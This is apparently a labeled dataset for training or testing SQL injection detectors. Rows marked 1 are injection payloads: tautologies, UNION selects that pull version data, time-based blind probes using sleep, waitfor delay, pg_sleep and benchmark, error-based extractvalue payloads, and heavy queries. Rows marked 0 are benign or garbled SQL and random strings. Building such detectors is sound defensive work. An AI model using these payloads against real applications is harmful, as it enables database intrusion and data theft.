Query,Label
select case when 6555  =  7349 then 1 else null end--,1
SELECT shake,0
miramar,0
3690,0
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss",1
"INSERT INTO baseball ( wrote, shall, your, half, rabbit, party )  VALUES  ( 'meal', 'ranch'. dead', 'engineer', 'steep', 'unusual', 'service' )",0
SELECT * FROM pictured WHERE nuts IN  ( SELECT slept FROM over ),0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj",1
if  (  4194  =  4133  )   select 4194 else drop function tqhz--,1
"select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1
villadecanes,0
serratosa@yiutuve.pe,0
"-3794'  )   union all select 2485,2485,2485,2485,2485--",1
SELECT * FROM nature WHERE price NOT LIKE 'angle%',0
-7231   )    )    union all select 7639#,1
"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",1
SELECT AVG ( clothing ) FROM sign SELECT SUM ( known ),0
"cuesta sagrado corazon, 155 5?a",0
SELECT * FROM depth WHERE since BETWEEN 'supper' AND 'rope',0
paz,0
"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )",1
"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",1
0x77616974666F722064656C61792027303A303A313027 ...,1
1'  )   where 7252  =  7252,1
bollullos de la mitacin,0
1'  )   where 4500  =  4500,1
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1
7.28211E+15,0
1'+  (  select 'njee' where 4101  =  4101 and 3090  =  7873  )  +',1
"SELECT ATAN ( -0.8, 2 ) ;",0
maren-bufford4@fruteriacartaya.yu,0
"-1993%""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,1
SELECT rather ( s )  FROM indeed LEFT JOIN,0
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
hotta,0
"1'  )   union all select null,null#",1
SELECT * FROM clear WHERE pig IN  ( SELECT discovery FROM north ),0
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,0
1478,0
orce,0
gldar,0
SELECT TOP 3 * FROM everyone SELECT * FROM music 3SELECT * FROM completely,0
ulpiano,0
SELECT MIN ( making )  AS minerals FROM plural,0
"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""gxqq""  =  ""gxqq",1
SELECT shelf FROM to,0
SELECT * FROM fat 3 SELECT * FROM dead,0
"UPDATE chart SET pleasant =  'diameter', City =  'post' WHERE get =  diagram",0
"1%'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",1
SELECT MIN ( taste )  AS involved FROM eight,0
SELECT * FROM desert WHERE flew = 'pleasure'  AND  ( according = 'won' OR flow = 'stretch' ),0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )",1
"SELECT enjoy, necessary, sentence FROM grain WHERE wrong  IS NULL",0
egner,0
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ),1
SELECT shore FROM land UNION ALL SELECT president FROM feel ORDER BY race,0
"SELECT Employees.adjective, COUNT ( Orders.oceanID )  AS guessFROM    ( OrdersINNER JOIN join ON Orders.deathID  =  Employees.snowID )",0
"select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1
1'||  (  select 'kyhs' from dual where 9491  =  9491,1
SELECT * FROM pay FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM mirror,0
SELECT TOP 3 * FROM supply SELECT * FROM dangerous 3SELECT * FROM lady,0
-8463   )    )     )   or 4861  =  9834#,1
4014,0
"SELECT column_name ( s )  FROM old,triangle",0
a65esad0,0
SELECT * FROM hit WHERE brick NOT LIKE '[similar]%',0
"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --",1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,1
SELECT MIN ( entirely )  AS factory FROM straight,0
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1
SELECT COUNT ( DISTINCT century )  FROM mouth,0
"SELECT SUBSTRING ( ""SQL Tutorial"", 5, 3 )  AS ExtractString;",0
1'+  (  select smze where 5616  =  5616,1
23 OR 1  =  1,1
89816761j,0
SELECT * FROM made WHERE group = 'crop' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( Price ) FROM income,0
SELECT TOP 3 * FROM push SELECT * FROM quick 3SELECT * FROM series,0
tubal,0
SELECT * FROM needle WHERE fog IN  ( SELECT darkness FROM appearance ),0
SELECT * FROM what,0
"SELECT fought, previous, occasionally FROM without WHERE meant  IS NULL",0
evacuacin,0
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1
SELECT visit ( s )  FROM service UNION,0
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ),1
1  )   where 2940  =  2940,1
pincel,0
2563,0
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1
SELECT religious FROM vegetable UNION ALL SELECT again FROM paper ORDER BY dark,0
SELECT white ( s )  FROM clearly SELECT excitement ( s ),0
"1%"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT * FROM rhyme ORDER BY heavy DESC,0
bogs terradas,0
1'||  (  select 'gved' from dual where 6965  =  6965,1
flixmara,0
"SELECT once,meat,hat FROM only LEFT JOIN Orders ON either.sleptID =  to.poetry ORDER BY rocky.faster",0
cotner,0
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",1
"SELECT * FROM drove WHERE dark NOT IN  ( 'younger', 'swung', 'term' )",0
"passatge credit, 93, 13-c",0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1
50491,0
gregescos,0
1' where 2913  =  2913 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
"SELECT * FROM shape ORDER BY mice, empty",0
"SELECT LEAST ( 3, 12, 34, 8, 25 ) ;",0
suto8i+a,0
av. del mar cantabrico 176 6-d,0
SELECT closely ( s )  FROM over SELECT basket FROM mission,0
sineiro herranz,0
euzaine@schnapps.com.gs,0
"SELECT fox AS north, ahead AS [each]  FROM office",0
SELECT * FROM  ( SELECT together FROM here ),0
SELECT TOP 3 * FROM airplane WHERE president = 'hollow' SELECT * FROM tube,0
SELECT * FROM gently  WHERE relationship NOT LIKE '[steep]%',0
"1   )    )    union all select null,null,null,null,null,null#",1
SELECT * FROM  ( SELECT broad FROM pig ),0
firestone@artforall.ag,0
garzon6@mtos.ro,0
8170,0
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",1
villadoz,0
SELECT TOP 50 PERCENT * FROM prepare,0
SELECT * FROM there WHERE NOT past = 'purpose'  AND NOT principal = 'secret',0
SELECT * FROM mouth WHERE    NOT current = 'hall',0
ensminge,0
"cardenal mendoza s/n, 7?h",0
SELECT TOP 50 PERCENT * FROM subject SELECT * FROM people FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM building,0
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",1
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",1
SELECT your ( s )  FROM onto FULL OUTER JOIN,0
16435,0
SELECT * FROM  ( SELECT compare FROM private ),0
SELECT TOP 3 * FROM depend WHERE piano = 'best',0
"SELECT * FROM smoke WHERE organization BETWEEN ""its"" AND    ""leave""",0
inconse_cuente,0
"SELECT * FROM swept ORDER BY beginning, including",0
valdelagua del cerro,0
SELECT * FROM dot WHERE hungry = 'threw',0
? or 1  =  1 --,1
nebila,0
SELECT * FROM express,0
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """,1
"SELECT produce,wild,nearly,necessary,when     (  (  statement JOIN himself ON found.voice =  that.poem )   INNER JOIN sweptON Orders.college =  if.creamID )",0
SELECT * FROM  ( SELECT start FROM production ),0
"1   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   2748  =  2748",1
SELECT COUNT ( both ) FROM divide,0
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1
SELECT AVG ( sand ) FROM to SELECT SUM ( direction ),0
SELECT * FROM spread  WHERE curious = slow,0
58193627q,0
rodis-ryan@colorprint.info,0
des9o89451rac28,0
saetero farrer,0
ex8ed2ci3,0
"select pg_sleep  (  5  )   and    (    (   ""qani""  =  ""qani",1
"select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1
10155328t,0
SELECT * FROM merely,0
SELECT * FROM did WHERE wood BETWEEN west09/01/1996stomach AND doing15/31/1996manner,0
knyht9@aspirantes.lt,0
SELECT * FROM soon WHERE knew IN  ( SELECT book FROM branch ),0
SELECT AVG ( rest ) FROM toy SELECT SUM ( be ),0
"select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--",1
1  )   as qwsa where 2874  =  2874,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28638 )  ORDER BY meta_id ASC",0
"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621",1
1 where 4940  =  4940,1
c742na79,0
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",1
"1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM but,0
1'1,1
"select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1
"SELECT column_name ( s )  FROM nice,nose",0
SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM leather,0
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,1
waitfor delay '0:0:5' and '%'  =  ',1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,1
1   )    )    as kccx where 7547  =  7547 union all select null--,1
a06b6,0
caballillo,0
SELECT yes FROM widely UNION ALL SELECT if FROM independent ORDER BY native,0
67242195q,0
SELECT * FROM judge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM troops,0
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1
"SELECT * FROM thy WHERE stems BETWEEN ""suit"" AND    ""breath""",0
SELECT * FROM develop,0
-5369'  )   or 3208  =  6669#,1
-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,1
SELECT * FROM  ( SELECT gradually FROM sharp ),0
SELECT * FROM draw WHERE longer NOT LIKE '[whose]%',0
7387,0
41392002y,0
SELECT * FROM way WHERE vertical NOT LIKE 'member%',0
SELECT * FROM successful FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM capital,0
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,1
8.366E+15,0
canal dolcet,0
"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",1
9362,0
burns-gerron@100mbps.ht,0
19784273h,0
SELECT COUNT ( incomeID ) FROM introduced,0
"1'  )   where 6774  =  6774 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ),1
1'+  (  select gqez where 3704  =  3704,1
rosngela,0
SELECT * FROM line FETCH FIRST 50 PERCENT ROWS ONLY,0
"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1
"1%""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,1
SELECT help ( s )  FROM bat SELECT cap ( s ),0
"INSERT INTO highway  ( cheese, age, pale )  VALUES  ( 'gun', 'mix', 'fast' )",0
SELECT * FROM far WHERE possibly = 'world',0
SELECT laid FROM anything,0
SELECT * FROM couple WHERE try = 'pupil'  OR body = 'orbit',0
-4901  )   or 3407  =  6442#,1
rigente,0
52207398c,0
1  )   where 5025  =  5025,1
select case when 5433  =  6458 then 1 else null end--,1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""njdx"" like ""njdx",1
SELECT adjective ( s )  FROM short FULL OUTER JOIN,0
1%'  )   union all select null--,1
renata,0
SELECT * FROM bottle WHERE hearing = 'careful'  AND  ( number = 'table' OR excited = 'consist' ),0
suplementero,0
SELECT * FROM born WHERE broken NOT LIKE '[therefore]%',0
"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",1
klaudt,0
"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT rising ( s FROM turn RIGHT JOIN,0
alegre nomdedeu,0
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",1
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",1
"SELECT * FROM promised ORDER BY there, bet",0
5.24225E+13,0
-7187' or 4159  =  7465,1
1'   )    )     )   and 3602  =  1990#,1
"select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
1'+  (  select 'wyed' where 9896  =  9896,1
1' where 4795  =  4795 and 4595  =  4595#,1
dukes,0
SELECT being FROM call UNION SELECT himself FROM taken ORDER BY income,0
pearce,0
"calle los tipografos, 98, 4g",0
"1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#",1
SELECT * FROM bound WHERE did BETWEEN 'began' AND 'inch',0
cary-whitten@magritte.pe,0
1'  )   where 6244  =  6244 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
"-4427'   )    )    union all select 6357,6357,6357,6357,6357#",1
"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",1
1  )   as hggi where 6511  =  6511,1
"SELECT Employees.fact, COUNT ( Orders.studyingID )  AS ponyFROM    ( OrdersINNER JOIN studied ON Orders.resultID  =  Employees.vastID )",0
zulmara,0
SELECT TOP 3 * FROM sharp SELECT * FROM quarter 3SELECT * FROM football,0
SELECT * FROM enjoy WHERE shirt BETWEEN 'stranger' AND 'most',0
SELECT * FROM glass,0
SELECT * FROM meal WHERE brick = 'course'  OR island = 'feature',0
SELECT AVG ( Price ) FROM carry,0
SELECT * FROM colony  WHERE cook = everybody,0
SELECT * FROM manufacturing WHERE let NOT LIKE 'just%',0
6.98863E+15,0
1'||  (  select 'ilkr' from dual where 9296  =  9296,1
tracee,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",1
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",1
88360528w,0
SELECT MIN ( right )  AS different FROM factor,0
03291016s,0
select case when 6662  =  9889 then 1 else null end--,1
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",1
SELECT AVG ( mixture ) FROM experience SELECT SUM ( nuts ),0
mcnear.trotta@lettere.ve,0
SELECT TOP 3 * FROM useful SELECT * FROM fast 3SELECT * FROM relationship,0
80937614q,0
"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",1
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg",1
1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #,1
SELECT * FROM attack WHERE unless = 'task' LIMIT 3,0
lombardo,0
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1
SELECT * FROM anybody WHERE dear = 'dirt' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( baby ) FROM recent,0
12489,0
SELECT DISTINCT consonant FROM ago,0
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""fpkm"" like ""fpkm",1
"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT * FROM orbit WHERE card = 'children'  OR regular = 'path',0
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'qtul' like 'qtul,1
